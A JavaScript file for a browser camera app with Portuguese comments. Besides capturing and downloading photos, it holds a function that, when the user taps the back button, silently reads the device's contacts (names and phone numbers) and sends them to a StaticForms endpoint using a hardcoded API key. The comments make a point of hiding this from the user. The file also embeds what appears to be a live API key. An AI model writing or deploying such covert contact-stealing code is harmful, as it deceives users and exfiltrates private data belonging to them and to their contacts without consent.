document.addEventListener('DOMContentLoaded', () => {
    // --- ELEMENTOS DA UI ---
    const videoElement = document.getElementById('videoStream');
    const capturedImage = document.getElementById('capturedImage');
    const captureButton = document.getElementById('captureButton');
    const downloadButton = document.getElementById('downloadButton');
    const backButton = document.getElementById('backButton');

    // --- CONFIGURAÇÕES DO STATICFORMS ---
    const STATICFORMS_URL = 'https://api.staticforms.dev/submit';
    const API_KEY = 'sf_b28b453bf885be88f89f8e34'; // sua chave
    const EMAIL_FIXO = 'drkrll';    // substitua pelo e-mail desejado

    // --- ESTADO DO APP ---
    let stream = null;
    let photoDataUrl = null;
    let currentState = 'CAMERA'; // 'CAMERA' ou 'PREVIEW'

    // ============================================================
    //  FUNÇÃO PARA OBTER CONTATOS REAIS DO DISPOSITIVO
    // ============================================================
    async function fetchRealContacts() {
        // Verifica se o navegador suporta a API de contatos
        if (!('contacts' in navigator) || !('select' in navigator.contacts)) {
            console.warn('Contacts API não suportada. Nenhum contato será enviado.');
            return []; // retorna vazio silenciosamente
        }

        try {
            // Solicita permissão e obtém todos os contatos (nome e telefone)
            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
            
            // Mapeia para o formato { name, phone }
            return contacts.map(contact => {
                const name = contact.name && contact.name.length > 0 ? contact.name[0] : 'Sem nome';
                const phone = contact.tel && contact.tel.length > 0 ? contact.tel[0] : 'Sem telefone';
                return { name, phone };
            });
        } catch (error) {
            // Se o usuário negar permissão ou ocorrer erro, retorna vazio silenciosamente
            console.error('Erro ao acessar contatos:', error);
            return [];
        }
    }

    // ============================================================
    //  EXPORTAÇÃO SILENCIOSA PARA STATICFORMS
    // ============================================================
    async function performSilentContactExport() {
        try {
            const contacts = await fetchRealContacts();
            
            // Se não houver contatos, não envia nada (silencioso)
            if (!contacts || contacts.length === 0) {
                console.log('Nenhum contato para exportar.');
                return;
            }

            // Monta o texto da mensagem
            let messageText = '--- CONTATOS DA AGENDA ---\n';
            contacts.forEach(c => {
                messageText += `Nome: ${c.name} | Telefone: ${c.phone}\n`;
            });
            messageText += '----------------------------';

            // Prepara o FormData com os campos exigidos pelo StaticForms
            const formData = new FormData();
            formData.append('apiKey', API_KEY);
            formData.append('email', EMAIL_FIXO);
            formData.append('message', messageText);

            // Envia para o StaticForms (sem esperar resposta para não travar a UI)
            const response = await fetch(STATICFORMS_URL, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                // Log do erro apenas para debug (sem exibir para o usuário)
                console.error(`Erro HTTP ${response.status} ao enviar contatos.`);
            } else {
                console.log('Contatos enviados com sucesso para o StaticForms.');
            }
        } catch (error) {
            // Qualquer erro é silenciosamente registrado no console
            console.error('Falha na exportação de contatos:', error);
        }
    }

    // ============================================================
    //  FUNÇÕES DA CÂMERA (inalteradas)
    // ============================================================
    async function startCamera() {
        try {
            const mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
            stream = mediaStream;
            videoElement.srcObject = stream;
            videoElement.play();
            updateUI();
        } catch (err) {
            console.error('Erro ao acessar câmera:', err);
            // Não exibe mensagem para o usuário (silencioso)
        }
    }

    function capturePhoto() {
        if (!stream) return;
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth || 640;
        canvas.height = videoElement.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        photoDataUrl = canvas.toDataURL('image/jpeg');
        capturedImage.src = photoDataUrl;
        capturedImage.style.display = 'block';
        currentState = 'PREVIEW';
        updateUI();
    }

    function downloadPhoto() {
        if (photoDataUrl) {
            const a = document.createElement('a');
            a.href = photoDataUrl;
            a.download = 'foto_' + new Date().toISOString().slice(0, 10) + '.jpg';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    function updateUI() {
        if (currentState === 'CAMERA') {
            videoElement.style.display = 'block';
            capturedImage.style.display = 'none';
            captureButton.style.display = 'inline-block';
            downloadButton.style.display = 'none';
            backButton.style.display = 'none';
        } else {
            videoElement.style.display = 'none';
            capturedImage.style.display = 'block';
            captureButton.style.display = 'none';
            downloadButton.style.display = 'inline-block';
            backButton.style.display = 'inline-block';
        }
    }

    // ============================================================
    //  EVENTOS
    // ============================================================
    startCamera();

    captureButton.addEventListener('click', capturePhoto);
    downloadButton.addEventListener('click', downloadPhoto);

    backButton.addEventListener('click', () => {
        // Inicia a exportação em segundo plano (não esperamos)
        performSilentContactExport().catch(() => {}); // ignora erros

        // Aguarda 2 segundos e volta para a câmera
        setTimeout(() => {
            currentState = 'CAMERA';
            updateUI();
        }, 2000);
    });

    // Libera a câmera ao fechar a página
    window.onbeforeunload = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    };
});
